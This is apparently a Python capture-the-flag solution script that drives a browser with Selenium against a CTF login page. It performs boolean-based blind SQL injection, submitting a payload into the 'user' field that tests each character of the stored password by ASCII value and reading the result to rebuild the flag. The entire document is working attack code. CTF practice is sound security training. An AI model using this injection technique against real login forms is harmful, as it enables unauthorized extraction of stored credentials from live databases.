from selenium import webdriver
from bs4 import BeautifulSoup
import re

driver = webdriver.Chrome('chromedriver.exe')
driver.get('http://ctf.adl.csie.ncu.edu.tw:9487/')
flag = "AD{"
current = ""
end = 0

for item in range(4, 30):
            
    for char in range(95, 126):
            
        user = driver.find_element_by_name('user')
        payload = '\' or ascii(substring((SELECT password from users), %d, 1)) = %d#'
        user.send_keys(payload % (item, char))
        current = chr(char)
        user.submit()

        pageSource = driver.page_source
        soup = BeautifulSoup(pageSource, 'html.parser')
        result = soup.select('h3')[0].get_text()
        find = re.search('Successful', result)
            
        if find:
            flag += current
            print("Flag:" + flag)
            if current == '}':
                end = 1  
            driver.back()
            user = driver.find_element_by_name('user')
            user.clear()
            break
        
        driver.back()
        user = driver.find_element_by_name('user')
        user.clear()

    if end == 1:
        break
